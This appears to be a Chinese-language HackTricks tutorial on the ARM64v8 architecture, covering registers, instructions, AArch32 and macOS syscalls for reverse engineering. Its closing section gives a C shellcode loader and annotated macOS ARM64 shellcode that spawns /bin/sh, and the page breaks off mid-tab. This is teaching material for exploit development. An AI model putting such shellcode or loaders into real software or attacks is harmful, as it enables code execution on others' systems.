# ARM64v8简介

{{#include ../../../banners/hacktricks-training.md}}

## **异常级别 - EL (ARM64v8)**

在ARMv8架构中，执行级别称为异常级别（EL），定义了执行环境的特权级别和能力。共有四个异常级别，从EL0到EL3，每个级别有不同的用途：

1. **EL0 - 用户模式**：
- 这是特权最低的级别，用于执行常规应用程序代码。
- 在EL0运行的应用程序相互隔离，并与系统软件隔离，从而增强安全性和稳定性。
2. **EL1 - 操作系统内核模式**：
- 大多数操作系统内核在此级别运行。
- EL1的特权高于EL0，可以访问系统资源，但有一些限制以确保系统完整性。
3. **EL2 - 虚拟机监控模式**：
- 此级别用于虚拟化。在EL2运行的虚拟机监控程序可以管理多个操作系统（每个操作系统在自己的EL1中）在同一物理硬件上运行。
- EL2提供了对虚拟化环境的隔离和控制功能。
4. **EL3 - 安全监控模式**：
- 这是特权最高的级别，通常用于安全启动和受信执行环境。
- EL3可以管理和控制安全状态与非安全状态之间的访问（例如安全启动、受信OS等）。

使用这些级别可以以结构化和安全的方式管理系统的不同方面，从用户应用程序到最特权的系统软件。ARMv8对特权级别的处理有助于有效隔离不同的系统组件，从而增强系统的安全性和稳健性。

## **寄存器 (ARM64v8)**

ARM64有**31个通用寄存器**，标记为`x0`到`x30`。每个寄存器可以存储一个**64位**（8字节）值。对于只需要32位值的操作，可以使用w0到w30以32位模式访问相同的寄存器。

1. **`x0`**到**`x7`** - 这些通常用作临时寄存器和传递参数给子例程。
- **`x0`**还携带函数的返回数据。
2. **`x8`** - 在Linux内核中，`x8`用作`svc`指令的系统调用号。**在macOS中使用的是x16！**
3. **`x9`**到**`x15`** - 更多的临时寄存器，通常用于局部变量。
4. **`x16`**和**`x17`** - **过程内调用寄存器**。用于立即值的临时寄存器。它们也用于间接函数调用和PLT（过程链接表）存根。
- **`x16`**在**macOS**中用作**`svc`**指令的**系统调用号**。
5. **`x18`** - **平台寄存器**。可以用作通用寄存器，但在某些平台上，此寄存器保留用于平台特定用途：在Windows中指向当前线程环境块，或指向当前**执行任务结构在linux内核**中。
6. **`x19`**到**`x28`** - 这些是被调用者保存的寄存器。函数必须为其调用者保留这些寄存器的值，因此它们存储在堆栈中，并在返回调用者之前恢复。
7. **`x29`** - **帧指针**，用于跟踪堆栈帧。当由于调用函数而创建新的堆栈帧时，**`x29`**寄存器被**存储在堆栈**中，**新的**帧指针地址（**`sp`**地址）被**存储在此寄存器**中。
- 此寄存器也可以用作**通用寄存器**，尽管通常用作对**局部变量**的引用。
8. **`x30`**或**`lr`** - **链接寄存器**。它在执行`BL`（带链接的分支）或`BLR`（带链接到寄存器的分支）指令时保存**返回地址**，通过将**`pc`**值存储在此寄存器中。
- 它也可以像其他寄存器一样使用。
- 如果当前函数将调用新函数并因此覆盖`lr`，它将在开始时将其存储在堆栈中，这是尾声（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> 存储`fp`和`lr`，生成空间并获取新的`fp`）并在结束时恢复，这是序言（`ldp x29, x30, [sp], #48; ret` -> 恢复`fp`和`lr`并返回）。
9. **`sp`** - **堆栈指针**，用于跟踪堆栈顶部。
- **`sp`**值应始终保持至少为**四字**对齐，否则可能会发生对齐异常。
10. **`pc`** - **程序计数器**，指向下一条指令。此寄存器只能通过异常生成、异常返回和分支进行更新。唯一可以读取此寄存器的普通指令是带链接的分支指令（BL，BLR），以将**`pc`**地址存储在**`lr`**（链接寄存器）中。
11. **`xzr`** - **零寄存器**。在其**32**位寄存器形式中也称为**`wzr`**。可以用来轻松获取零值（常见操作）或使用**`subs`**进行比较，如**`subs XZR, Xn, #10`**，将结果数据存储在无处（在**`xzr`**中）。

**`Wn`**寄存器是**`Xn`**寄存器的**32位**版本。

### SIMD和浮点寄存器

此外，还有另外**32个128位长度的寄存器**，可用于优化的单指令多数据（SIMD）操作和执行浮点运算。这些寄存器称为Vn寄存器，尽管它们也可以在**64**位、**32**位、**16**位和**8**位中操作，然后称为**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**和**`Bn`**。

### 系统寄存器

**有数百个系统寄存器**，也称为特殊用途寄存器（SPRs），用于**监控**和**控制**处理器的行为。\
它们只能通过专用的特殊指令**`mrs`**和**`msr`**进行读取或设置。

特殊寄存器**`TPIDR_EL0`**和**`TPIDDR_EL0`**在逆向工程中常见。`EL0`后缀表示可以访问寄存器的**最小异常**（在这种情况下，EL0是常规程序运行的常规异常（特权）级别）。\
它们通常用于存储**线程局部存储**内存区域的基地址。通常，第一个寄存器对在EL0中运行的程序可读可写，但第二个寄存器可以从EL0读取并从EL1写入（如内核）。

- `mrs x0, TPIDR_EL0 ; 将TPIDR_EL0读取到x0中`
- `msr TPIDR_EL0, X0 ; 将x0写入TPIDR_EL0`

### **PSTATE**

**PSTATE**包含多个进程组件，序列化到操作系统可见的**`SPSR_ELx`**特殊寄存器中，X是触发异常的**权限**级别（这允许在异常结束时恢复进程状态）。\
这些是可访问的字段：

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**、**`Z`**、**`C`**和**`V`**条件标志：
- **`N`**表示操作产生了负结果
- **`Z`**表示操作产生了零
- **`C`**表示操作产生了进位
- **`V`**表示操作产生了有符号溢出：
- 两个正数的和产生负结果。
- 两个负数的和产生正结果。
- 在减法中，当从较小的正数中减去较大的负数（或反之），结果无法在给定位数范围内表示。
- 显然，处理器不知道操作是有符号的还是无符号的，因此它将在操作中检查C和V，并在发生进位时指示。

> [!WARNING]
> 并非所有指令都会更新这些标志。一些指令如**`CMP`**或**`TST`**会更新，其他带有s后缀的指令如**`ADDS`**也会更新。

- 当前**寄存器宽度（`nRW`）标志**：如果标志的值为0，则程序在恢复后将以AArch64执行状态运行。
- 当前**异常级别**（**`EL`**）：在EL0中运行的常规程序将具有值0。
- **单步执行**标志（**`SS`**）：由调试器使用，通过异常将SS标志设置为1以进行单步执行。程序将执行一步并发出单步异常。
- **非法异常**状态标志（**`IL`**）：用于标记特权软件执行无效异常级别转移时，此标志设置为1，处理器触发非法状态异常。
- **`DAIF`**标志：这些标志允许特权程序选择性地屏蔽某些外部异常。
- 如果**`A`**为1，则表示将触发**异步中止**。**`I`**配置为响应外部硬件**中断请求**（IRQ）。F与**快速中断请求**（FIR）相关。
- **堆栈指针选择**标志（**`SPS`**）：在EL1及以上运行的特权程序可以在使用自己的堆栈指针寄存器和用户模型之间切换（例如，在`SP_EL1`和`EL0`之间）。此切换通过写入**`SPSel`**特殊寄存器执行。此操作无法从EL0完成。

## **调用约定 (ARM64v8)**

ARM64调用约定规定，**前八个参数**通过寄存器**`x0`到`x7`**传递。**额外**参数通过**堆栈**传递。**返回**值通过寄存器**`x0`**返回，或者在**`x1`**中返回**如果其长度为128位**。**`x19`**到**`x30`**和**`sp`**寄存器必须在函数调用之间**保留**。

在阅读汇编中的函数时，查找**函数序言和尾声**。**序言**通常涉及**保存帧指针（`x29`）**、**设置**新的**帧指针**和**分配堆栈空间**。**尾声**通常涉及**恢复保存的帧指针**和**从函数返回**。

### Swift中的调用约定

Swift有其自己的**调用约定**，可以在[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)中找到。

## **常见指令 (ARM64v8)**

ARM64指令通常具有**格式`opcode dst, src1, src2`**，其中**`opcode`**是要执行的**操作**（如`add`、`sub`、`mov`等），**`dst`**是将存储结果的**目标**寄存器，**`src1`**和**`src2`**是**源**寄存器。立即数值也可以替代源寄存器使用。

- **`mov`**：**移动**一个值从一个**寄存器**到另一个。
- 示例：`mov x0, x1` — 这将值从`x1`移动到`x0`。
- **`ldr`**：**加载**一个值从**内存**到一个**寄存器**。
- 示例：`ldr x0, [x1]` — 这将从`x1`指向的内存位置加载一个值到`x0`。
- **偏移模式**：指示影响原始指针的偏移，例如：
- `ldr x2, [x1, #8]`，这将加载`x1 + 8`中的值到`x2`。
- `ldr x2, [x0, x1, lsl #2]`，这将从数组`x0`中加载一个对象，从位置`x1`（索引）\* 4到`x2`。
- **预索引模式**：这将对原始值应用计算，获取结果并将新原始值存储在原始值中。
- `ldr x2, [x1, #8]!`，这将加载`x1 + 8`到`x2`并将结果存储在`x1`中。
- `str lr, [sp, #-4]!`，将链接寄存器存储在`sp`中并更新寄存器`sp`。
- **后索引模式**：这类似于前一个，但内存地址被访问，然后计算并存储偏移。
- `ldr x0, [x1], #8`，加载`x1`到`x0`并用`x1 + 8`更新`x1`。
- **PC相对寻址**：在这种情况下，加载的地址相对于PC寄存器计算。
- `ldr x1, =_start`，这将加载`_start`符号开始的地址到`x1`，与当前PC相关。
- **`str`**：**存储**一个值从一个**寄存器**到**内存**。
- 示例：`str x0, [x1]` — 这将值存储在`x0`到`x1`指向的内存位置。
- **`ldp`**：**加载寄存器对**。此指令**从**连续的内存**位置加载两个寄存器。内存地址通常通过将偏移添加到另一个寄存器中的值来形成。
- 示例：`ldp x0, x1, [x2]` — 这将从`x2`和`x2 + 8`的内存位置加载`x0`和`x1`。
- **`stp`**：**存储寄存器对**。此指令**将两个寄存器存储到**连续的内存**位置。内存地址通常通过将偏移添加到另一个寄存器中的值来形成。
- 示例：`stp x0, x1, [sp]` — 这将`x0`和`x1`存储到`sp`和`sp + 8`的内存位置。
- `stp x0, x1, [sp, #16]!` — 这将`x0`和`x1`存储到`sp+16`和`sp + 24`的内存位置，并用`sp+16`更新`sp`。
- **`add`**：**将**两个寄存器的值相加并将结果存储在一个寄存器中。
- 语法：add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> 目标
- Xn2 -> 操作数1
- Xn3 | #imm -> 操作数2（寄存器或立即数）
- \[shift #N | RRX] -> 执行移位或调用RRX
- 示例：`add x0, x1, x2` — 这将`x1`和`x2`中的值相加并将结果存储在`x0`中。
- `add x5, x5, #1, lsl #12` — 这等于4096（1左移12次）-> 1 0000 0000 0000 0000。
- **`adds`** 这执行一个`add`并更新标志。
- **`sub`**：**减去**两个寄存器的值并将结果存储在一个寄存器中。
- 检查**`add`** **语法**。
- 示例：`sub x0, x1, x2` — 这将从`x1`中减去`x2`的值并将结果存储在`x0`中。
- **`subs`** 这类似于减法，但更新标志。
- **`mul`**：**乘以**两个寄存器的值并将结果存储在一个寄存器中。
- 示例：`mul x0, x1, x2` — 这将`x1`和`x2`中的值相乘并将结果存储在`x0`中。
- **`div`**：**除以**一个寄存器的值并将结果存储在一个寄存器中。
- 示例：`div x0, x1, x2` — 这将`x1`中的值除以`x2`并将结果存储在`x0`中。
- **`lsl`**、**`lsr`**、**`asr`**、**`ror`**、**`rrx`**：
- **逻辑左移**：从末尾添加0，移动其他位（乘以n次2）。
- **逻辑右移**：从开头添加1，移动其他位（无符号除以n次2）。
- **算术右移**：类似于**`lsr`**，但如果最高有效位为1，则添加1（有符号除以n次2）。
- **右旋转**：类似于**`lsr`**，但从右侧移除的位附加到左侧。
- **带扩展的右旋转**：类似于**`ror`**，但将进位标志作为“最高有效位”。因此，进位标志移动到位31，移除的位移动到进位标志。
- **`bfm`**：**位域移动**，这些操作**从一个值中复制位`0...n`**并将其放置在**`m..m+n`**的位置。**`#s`**指定**最左边的位**位置，**`#r`**指定**右旋转量**。
- 位域移动：`BFM Xd, Xn, #r`
- 有符号位域移动：`SBFM Xd, Xn, #r, #s`
- 无符号位域移动：`UBFM Xd, Xn, #r, #s`
- **位域提取和插入**：从一个寄存器复制位域并将其复制到另一个寄存器。
- **`BFI X1, X2, #3, #4`** 从X2的第3位插入4位到X1。
- **`BFXIL X1, X2, #3, #4`** 从X2的第3位提取4位并复制到X1。
- **`SBFIZ X1, X2, #3, #4`** 从X2扩展4位并插入到X1，从第3位开始，右侧位清零。
- **`SBFX X1, X2, #3, #4`** 从X2的第3位提取4位，进行符号扩展，并将结果放入X1。
- **`UBFIZ X1, X2, #3, #4`** 从X2扩展4位并插入到X1，从第3位开始，右侧位清零。
- **`UBFX X1, X2, #3, #4`** 从X2的第3位提取4位并将零扩展的结果放入X1。
- **符号扩展到X**：扩展值的符号（或在无符号版本中仅添加0）以便能够进行操作：
- **`SXTB X1, W2`** 将字节的符号扩展**从W2到X1**（`W2`是`X2`的一半）以填充64位。
- **`SXTH X1, W2`** 将16位数的符号扩展**从W2到X1**以填充64位。
- **`SXTW X1, W2`** 将字节的符号扩展**从W2到X1**以填充64位。
- **`UXTB X1, W2`** 将0（无符号）添加到字节**从W2到X1**以填充64位。
- **`extr`**：从指定的**连接的寄存器对**中提取位。
- 示例：`EXTR W3, W2, W1, #3` 这将**连接W1+W2**并获取**从W2的第3位到W1的第3位**并存储在W3中。
- **`cmp`**：**比较**两个寄存器并设置条件标志。它是**`subs`**的**别名**，将目标寄存器设置为零寄存器。用于知道`m == n`。
- 它支持与**`subs`**相同的语法。
- 示例：`cmp x0, x1` — 这将比较`x0`和`x1`中的值并相应地设置条件标志。
- **`cmn`**：**比较负**操作数。在这种情况下，它是**`adds`**的**别名**，支持相同的语法。用于知道`m == -n`。
- **`ccmp`**：条件比较，它是仅在先前比较为真时执行的比较，并将特定设置nzcv位。
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> 如果x1 != x2且x3 < x4，则跳转到func。
- 这是因为**`ccmp`**仅在**先前的`cmp`为`NE`时执行，如果不是，位`nzcv`将设置为0（这不会满足`blt`比较）。
- 这也可以用作`ccmn`（相同但为负，如`cmp`与`cmn`）。
- **`tst`**：检查比较的值是否都为1（它的工作方式类似于不存储结果的AND）。用于检查寄存器与值，并检查寄存器中指示的位是否为1。
- 示例：`tst X1, #7` 检查X1的最后3位是否有1。
- **`teq`**：XOR操作，丢弃结果。
- **`b`**：无条件分支。
- 示例：`b myFunction`。
- 请注意，这不会用返回地址填充链接寄存器（不适合需要返回的子例程调用）。
- **`bl`**：**带链接的分支**，用于**调用**一个**子例程**。将**返回地址存储在`x30`**中。
- 示例：`bl myFunction` — 这调用函数`myFunction`并将返回地址存储在`x30`中。
- 请注意，这不会用返回地址填充链接寄存器（不适合需要返回的子例程调用）。
- **`blr`**：**带链接的分支到寄存器**，用于**调用**一个**子例程**，目标在**寄存器**中**指定**。将返回地址存储在`x30`中。
- 示例：`blr x1` — 这调用地址在`x1`中的函数，并将返回地址存储在`x30`中。
- **`ret`**：**从子例程返回**，通常使用**`x30`**中的地址。
- 示例：`ret` — 这使用`x30`中的返回地址从当前子例程返回。
- **`b.<cond>`**：条件分支。
- **`b.eq`**：**如果相等则分支**，基于先前的`cmp`指令。
- 示例：`b.eq label` — 如果先前的`cmp`指令发现两个值相等，则跳转到`label`。
- **`b.ne`**：**如果不相等则分支**。此指令检查条件标志（由先前的比较指令设置），如果比较的值不相等，则分支到标签或地址。
- 示例：在`cmp x0, x1`指令之后，`b.ne label` — 如果`x0`和`x1`中的值不相等，则跳转到`label`。
- **`cbz`**：**比较并在零时分支**。此指令将寄存器与零进行比较，如果相等，则分支到标签或地址。
- 示例：`cbz x0, label` — 如果`x0`中的值为零，则跳转到`label`。
- **`cbnz`**：**比较并在非零时分支**。此指令将寄存器与零进行比较，如果不相等，则分支到标签或地址。
- 示例：`cbnz x0, label` — 如果`x0`中的值非零，则跳转到`label`。
- **`tbnz`**：测试位并在非零时分支。
- 示例：`tbnz x0, #8, label`。
- **`tbz`**：测试位并在零时分支。
- 示例：`tbz x0, #8, label`。
- **条件选择操作**：这些操作的行为根据条件位的不同而变化。
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 如果为真，X0 = X1，如果为假，X0 = X2。
- `csinc Xd, Xn, Xm, cond` -> 如果为真，Xd = Xn，如果为假，Xd = Xm + 1。
- `cinc Xd, Xn, cond` -> 如果为真，Xd = Xn + 1，如果为假，Xd = Xn。
- `csinv Xd, Xn, Xm, cond` -> 如果为真，Xd = Xn，如果为假，Xd = NOT(Xm)。
- `cinv Xd, Xn, cond` -> 如果为真，Xd = NOT(Xn)，如果为假，Xd = Xn。
- `csneg Xd, Xn, Xm, cond` -> 如果为真，Xd = Xn，如果为假，Xd = - Xm。
- `cneg Xd, Xn, cond` -> 如果为真，Xd = - Xn，如果为假，Xd = Xn。
- `cset Xd, Xn, Xm, cond` -> 如果为真，Xd = 1，如果为假，Xd = 0。
- `csetm Xd, Xn, Xm, cond` -> 如果为真，Xd = \<all 1>，如果为假，Xd = 0。
- **`adrp`**：计算**符号的页地址**并将其存储在寄存器中。
- 示例：`adrp x0, symbol` — 这计算`symbol`的页地址并将其存储在`x0`中。
- **`ldrsw`**：**加载**一个有符号的**32位**值从内存并**符号扩展到64**位。
- 示例：`ldrsw x0, [x1]` — 这从`x1`指向的内存位置加载一个有符号的32位值，符号扩展到64位，并存储在`x0`中。
- **`stur`**：**将寄存器值存储到内存位置**，使用来自另一个寄存器的偏移。
- 示例：`stur x0, [x1, #4]` — 这将值存储在`x0`到比当前在`x1`中的地址大4字节的内存地址。
- **`svc`**：进行**系统调用**。它代表“监督者调用”。当处理器执行此指令时，它**从用户模式切换到内核模式**并跳转到内存中内核的系统调用处理代码所在的特定位置。

- 示例：

```armasm
mov x8, 93  ; 将退出的系统调用号（93）加载到寄存器x8中。
mov x0, 0   ; 将退出状态码（0）加载到寄存器x0中。
svc 0       ; 进行系统调用。
```

### **函数序言**

1. **将链接寄存器和帧指针保存到堆栈**：
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **设置新的帧指针**: `mov x29, sp` (为当前函数设置新的帧指针)  
3. **为局部变量在栈上分配空间（如果需要）**: `sub sp, sp, <size>` (其中 `<size>` 是所需的字节数)  

### **函数尾声**

1. **释放局部变量（如果有分配的话）**: `add sp, sp, <size>`  
2. **恢复链接寄存器和帧指针**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (使用链接寄存器中的地址将控制权返回给调用者)

## AARCH32 执行状态

Armv8-A 支持执行 32 位程序。**AArch32** 可以在 **两种指令集** 中运行：**`A32`** 和 **`T32`**，并可以通过 **`interworking`** 在它们之间切换。\
**特权** 64 位程序可以通过执行异常级别转移到较低特权的 32 位程序来调度 **32 位** 程序的执行。\
请注意，从 64 位到 32 位的过渡发生在异常级别降低时（例如，EL1 中的 64 位程序触发 EL0 中的程序）。这是通过在 `AArch32` 进程线程准备执行时将 **`SPSR_ELx`** 特殊寄存器的 **第 4 位** 设置为 **1** 来完成的，其余的 `SPSR_ELx` 存储 **`AArch32`** 程序的 CPSR。然后，特权进程调用 **`ERET`** 指令，使处理器过渡到 **`AArch32`**，根据 CPSR 进入 A32 或 T32**。**

**`interworking`** 通过 CPSR 的 J 和 T 位发生。`J=0` 和 `T=0` 表示 **`A32`**，而 `J=0` 和 `T=1` 表示 **T32**。这基本上意味着将 **最低位设置为 1** 以指示指令集为 T32。\
这在 **interworking 分支指令** 中设置，但也可以在 PC 设置为目标寄存器时通过其他指令直接设置。示例：

另一个示例：
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

有16个32位寄存器（r0-r15）。**从r0到r14**可以用于**任何操作**，但是其中一些通常是保留的：

- **`r15`**：程序计数器（始终）。包含下一条指令的地址。在A32中为当前 + 8，在T32中为当前 + 4。
- **`r11`**：帧指针
- **`r12`**：过程内调用寄存器
- **`r13`**：栈指针
- **`r14`**：链接寄存器

此外，寄存器在**`banked registries`**中备份。这些是存储寄存器值的地方，允许在异常处理和特权操作中执行**快速上下文切换**，以避免每次手动保存和恢复寄存器的需要。\
这是通过**将处理器状态从`CPSR`保存到`SPSR`**来完成的，保存到异常发生的处理器模式中。在异常返回时，**`CPSR`**从**`SPSR`**恢复。

### CPSR - 当前程序状态寄存器

在AArch32中，CPSR的工作方式类似于**`PSTATE`**在AArch64中，并且在发生异常时也存储在**`SPSR_ELx`**中，以便稍后恢复执行：

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

字段分为几个组：

- 应用程序状态寄存器（APSR）：算术标志，并可从EL0访问
- 执行状态寄存器：进程行为（由操作系统管理）。

#### 应用程序状态寄存器（APSR）

- **`N`**、**`Z`**、**`C`**、**`V`** 标志（与AArch64相同）
- **`Q`** 标志：每当执行专用饱和算术指令时，**整数饱和**发生时设置为1。一旦设置为**`1`**，它将保持该值，直到手动设置为0。此外，没有任何指令隐式检查其值，必须手动读取。
- **`GE`**（大于或等于）标志：用于SIMD（单指令，多数据）操作，例如“并行加”和“并行减”。这些操作允许在单个指令中处理多个数据点。

例如，**`UADD8`** 指令**并行添加四对字节**（来自两个32位操作数），并将结果存储在32位寄存器中。然后，它**根据这些结果设置`APSR`中的`GE`标志**。每个GE标志对应于一个字节加法，指示该字节对的加法是否**溢出**。

**`SEL`** 指令使用这些GE标志执行条件操作。

#### 执行状态寄存器

- **`J`** 和 **`T`** 位：**`J`** 应为0，如果 **`T`** 为0，则使用指令集A32，如果为1，则使用T32。
- **IT块状态寄存器**（`ITSTATE`）：这些是10-15和25-26的位。它们存储**`IT`**前缀组内指令的条件。
- **`E`** 位：指示**字节序**。
- **模式和异常掩码位**（0-4）：它们确定当前执行状态。**第5位**指示程序以32位（1）或64位（0）运行。其他4位表示**当前使用的异常模式**（当发生异常并正在处理时）。设置的数字**指示当前优先级**，以防在处理此异常时触发另一个异常。

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**：某些异常可以使用位**`A`**、`I`、`F`禁用。如果**`A`**为1，则表示将触发**异步中止**。**`I`**配置为响应外部硬件**中断请求**（IRQ）。F与**快速中断请求**（FIR）相关。

## macOS

### BSD系统调用

查看[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)。BSD系统调用将具有**x16 > 0**。

### Mach陷阱

在[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)中查看`mach_trap_table`，在[**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)中查看原型。Mach陷阱的最大数量为`MACH_TRAP_TABLE_COUNT` = 128。Mach陷阱将具有**x16 < 0**，因此您需要用**负号**调用前面列表中的数字：**`_kernelrpc_mach_vm_allocate_trap`**是**`-10`**。

您还可以在反汇编器中检查**`libsystem_kernel.dylib`**以找到如何调用这些（和BSD）系统调用：
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
注意，**Ida** 和 **Ghidra** 也可以通过传递缓存来反编译 **特定的 dylibs**。

> [!TIP]
> 有时检查 **`libsystem_kernel.dylib`** 的 **反编译** 代码比检查 **源代码** 更容易，因为多个系统调用（BSD 和 Mach）的代码是通过脚本生成的（查看源代码中的注释），而在 dylib 中你可以找到被调用的内容。

### machdep 调用

XNU 支持另一种称为机器依赖的调用。这些调用的数量取决于架构，调用或数量都不保证保持不变。

### comm 页面

这是一个内核拥有的内存页面，映射到每个用户进程的地址空间中。它旨在使从用户模式到内核空间的转换比使用系统调用更快，因为这些内核服务的使用频率很高，这样的转换会非常低效。

例如，调用 `gettimeofdate` 直接从 comm 页面读取 `timeval` 的值。

### objc_msgSend

在 Objective-C 或 Swift 程序中，找到这个函数是非常常见的。这个函数允许调用一个 Objective-C 对象的方法。

参数（[文档中更多信息](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)）：

- x0: self -> 指向实例的指针
- x1: op -> 方法的选择器
- x2... -> 被调用方法的其余参数

因此，如果在调用此函数的分支之前设置断点，你可以很容易地在 lldb 中找到被调用的内容（在这个例子中，对象调用了一个来自 `NSConcreteTask` 的对象，该对象将运行一个命令）：
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 设置环境变量 **`NSObjCMessageLoggingEnabled=1`** 可以记录此函数在文件 `/tmp/msgSends-pid` 中被调用的情况。
>
> 此外，设置 **`OBJC_HELP=1`** 并调用任何二进制文件，您可以看到其他环境变量，您可以使用这些变量来 **log** 某些 Objc-C 操作发生时的情况。

当调用此函数时，需要找到所指实例的调用方法，为此进行不同的搜索：

- 执行乐观缓存查找：
- 如果成功，完成
- 获取 runtimeLock（读取）
- 如果 (realize && !cls->realized) 实现类
- 如果 (initialize && !cls->initialized) 初始化类
- 尝试类自己的缓存：
- 如果成功，完成
- 尝试类方法列表：
- 如果找到，填充缓存并完成
- 尝试超类缓存：
- 如果成功，完成
- 尝试超类方法列表：
- 如果找到，填充缓存并完成
- 如果 (resolver) 尝试方法解析器，并从类查找重复
- 如果仍然在这里（= 所有其他都失败了）尝试转发器

### Shellcodes

要编译：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
提取字节：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
对于较新的 macOS：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>测试 shellcode 的 C 代码</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

取自[**这里**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)并进行了解释。

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
